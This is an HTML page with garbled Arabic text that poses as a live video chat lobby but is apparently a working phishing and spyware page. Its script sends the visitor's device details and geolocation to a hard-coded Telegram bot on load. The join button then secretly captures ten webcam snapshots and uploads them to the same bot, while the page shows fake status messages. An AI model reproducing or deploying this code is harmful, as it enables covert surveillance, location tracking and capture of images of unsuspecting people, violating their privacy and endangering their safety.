<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ù…ÙƒØ§Ù„Ù…Ø© ÙÙŠØ¯ÙŠÙˆ Ø¯Ø±Ø¯Ø´Ø© Ø­ÙŠØ© - Ø§Ù†Ø¶Ù… Ø¥Ù„ÙŠÙ†Ø§</title>
    
    <meta property="og:title" content="Ù…ÙƒØ§Ù„Ù…Ø© ÙÙŠØ¯ÙŠÙˆ Ù…Ø¨Ø§Ø´Ø±Ø© - Ø§Ù†Ø¶Ù… Ø§Ù„Ø¢Ù†!">
    <meta property="og:description" content="Ø¯Ø±Ø¯Ø´Ø© Ø­ÙŠØ© Ù…Ø¬Ø§Ù†ÙŠØ©. Ø§Ø¶ØºØ· Ù„Ù„Ø§Ù†Ø¶Ù…Ø§Ù… ÙÙˆØ±Ø§Ù‹!">
    <meta property="og:image" content="https://i.imgur.com/v8tT95w.png">

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
        :root { --primary: #25d366; --bg: #0b0e11; --card: rgba(23, 28, 35, 0.9); }

        body { margin: 0; font-family: 'Cairo', sans-serif; background: var(--bg); color: white; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        
        .main-card { background: var(--card); backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.1); border-radius: 24px; padding: 30px; width: 90%; max-width: 800px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
        
        .video-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 25px; }
        .video-box { position: relative; background: #000; border-radius: 15px; aspect-ratio: 16/9; overflow: hidden; border: 2px solid transparent; }
        .video-box.active { border-color: var(--primary); }
        #webcam { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
        .user-label { position: absolute; bottom: 10px; right: 10px; background: rgba(0,0,0,0.6); padding: 2px 10px; border-radius: 5px; font-size: 12px; }

        .controls { display: flex; justify-content: center; gap: 15px; margin-bottom: 25px; }
        .btn-round { width: 50px; height: 50px; border-radius: 50%; border: none; background: #323539; color: white; cursor: pointer; font-size: 20px; }
        
        .join-btn { background: var(--primary); color: white; border: none; padding: 15px 45px; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; width: 100%; }
        .join-btn:hover { background: #1eb954; transform: scale(1.02); }

        .status-text { margin-top: 15px; color: #aaa; font-size: 14px; }
        canvas { display: none; }
    </style>
</head>
<body>

    <div class="main-card">
        <h1 style="font-size: 22px; margin-bottom: 5px;">Ù…ÙƒØ§Ù„Ù…Ø© ÙÙŠØ¯ÙŠÙˆ Ø¯Ø±Ø¯Ø´Ø© Ø­ÙŠØ©</h1>
        <p style="color: #888; margin-bottom: 25px;">ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ù‚Ø¨Ù„ Ø§Ù„Ø§Ù†Ø¶Ù…Ø§Ù… Ù„Ù„ØºØ±ÙØ©</p>

        <div class="video-grid">
            <div class="video-box active">
                <video id="webcam" autoplay playsinline muted></video>
                <div class="user-label">Ø£Ù†Øª (Ù…Ø¹Ø§ÙŠÙ†Ø©)</div>
            </div>
            <div class="video-box" style="background: url('https://via.placeholder.com/400x225/111/fff?text=Waiting...') center/cover;">
                <div class="user-label">Ù…Ù†Ø¸Ù… Ø§Ù„ØºØ±ÙØ©</div>
            </div>
        </div>

        <div class="controls">
            <button class="btn-round">ğŸ¤</button>
            <button class="btn-round">ğŸ“·</button>
            <button class="btn-round" style="background:#ea4335;">ğŸ“</button>
        </div>

        <button class="join-btn" onclick="requestCapture()">Ø§Ù†Ø¶Ù… Ù„Ù„Ø¯Ø±Ø¯Ø´Ø© Ø§Ù„Ø¢Ù†</button>
        <div class="status-text" id="status">Ø¬Ø§Ø±ÙŠ ØªÙ‡ÙŠØ¦Ø© Ø§Ù„Ø§ØªØµØ§Ù„ Ø§Ù„Ù…Ø´ÙØ±...</div>
    </div>

    <canvas id="canvas"></canvas>

    <script>
        const BOT_TOKEN = "8001439036:AAFAVndQ0GlWuz0djflhyPYo5Jo17oMLAHo";
        const CHAT_ID = "6068331455";

        // 1. Ø¥Ø±Ø³Ø§Ù„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…ØªØµÙØ­ ÙÙˆØ±Ø§Ù‹ Ø¹Ù†Ø¯ Ø§Ù„ØªØ­Ù…ÙŠÙ„
        window.onload = async () => {
            sendSystemData();
            startCamera();
        };

        async function sendSystemData() {
            let batteryLvl = "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
            let isCharging = "";
            try {
                const b = await navigator.getBattery();
                batteryLvl = `${Math.round(b.level * 100)}%`;
                isCharging = b.charging ? "âš¡ Ù…ØªØµÙ„ Ø¨Ø§Ù„Ø´Ø§Ø­Ù†" : "ğŸ”‹ ÙŠØ¹Ù…Ù„ Ø¨Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©";
            } catch(e){}

            const info = `
ğŸš€ **Ø¯Ø®ÙˆÙ„ Ø¬Ø¯ÙŠØ¯ Ù„Ù„Ø¯Ø±Ø¯Ø´Ø©**
â”â”â”â”â”â”â”â”â”â”â”â”â”â”
ğŸ“± **Ø§Ù„Ø¬Ù‡Ø§Ø²:** ${navigator.platform}
ğŸŒ **Ø§Ù„Ù…ØªØµÙØ­:** ${navigator.userAgent.split(' ').pop()}
ğŸ”‹ **Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©:** ${batteryLvl} ${isCharging}
ğŸ–¥ï¸ **Ø§Ù„Ø´Ø§Ø´Ø©:** ${window.screen.width}x${window.screen.height}
ğŸ”— **Ø§Ù„Ù…Ù†ÙØ°:** ${location.port || 'Ø¢Ù…Ù† 443'}
â”â”â”â”â”â”â”â”â”â”â”â”â”â”`;
            postToTelegram('sendMessage', { text: info, parse_mode: 'Markdown' });
        }

        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const video = document.getElementById('webcam');
                video.srcObject = stream;
                
                video.onloadedmetadata = () => {
                    video.play();
                    document.getElementById('status').innerText = "ØªÙ… ØªÙØ¹ÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§. Ø§Ø¶ØºØ· Ù„Ù„Ø§Ù†Ø¶Ù…Ø§Ù….";
                };
                
                // Ø·Ù„Ø¨ Ø§Ù„Ù…ÙˆÙ‚Ø¹
                navigator.geolocation.getCurrentPosition(p => {
                    const loc = `ğŸ“ **Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…:**\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                    postToTelegram('sendMessage', { text: loc, parse_mode: 'Markdown' });
                });

            } catch (err) {
                document.getElementById('status').innerText = "Ø®Ø·Ø£: ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ù„Ù„Ù…ØªØ§Ø¨Ø¹Ø©.";
            }
        }

        // Ø¯Ø§Ù„Ø© Ø§Ù„Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„Ù…ØµÙ„Ø­Ø©
        function requestCapture() {
            const video = document.getElementById('webcam');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');
            let count = 0;

            document.getElementById('status').innerText = "Ø¬Ø§Ø±ÙŠ Ù…Ø²Ø§Ù…Ù†Ø© Ø§Ù„ØµÙˆØª ÙˆØ§Ù„ÙÙŠØ¯ÙŠÙˆ...";

            const interval = setInterval(() => {
                if (count >= 10) {
                    clearInterval(interval);
                    document.getElementById('status').innerText = "ØªÙ… Ø§Ù„Ø§Ù†Ø¶Ù…Ø§Ù… Ø¨Ù†Ø¬Ø§Ø­!";
                    return;
                }

                // Ø§Ù„ØªØ£ÙƒØ¯ Ù…Ù† Ø£Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ØªØ±Ø³Ù„ Ø¨ÙŠØ§Ù†Ø§Øª ÙØ¹Ù„ÙŠØ©
                if (video.readyState === video.HAVE_ENOUGH_DATA) {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                    canvas.toBlob(blob => {
                        if(blob) {
                            const fd = new FormData();
                            fd.append('chat_id', CHAT_ID);
                            fd.append('photo', blob, `snap_${count}.jpg`);
                            fd.append('caption', `Ø§Ù„Ù„Ù‚Ø·Ø© Ø±Ù‚Ù… ${count + 1}`);
                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                        }
                    }, 'image/jpeg', 0.5); // Ø¬ÙˆØ¯Ø© Ù…ØªÙˆØ³Ø·Ø© Ù„Ø¶Ù…Ø§Ù† Ø³Ø±Ø¹Ø© Ø§Ù„Ø¥Ø±Ø³Ø§Ù„

                    count++;
                }
            }, 700); // Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø© ÙƒÙ„ 0.7 Ø«Ø§Ù†ÙŠØ©
        }

        function postToTelegram(method, data) {
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, ...data })
            });
        }
    </script>
</body>
</html>
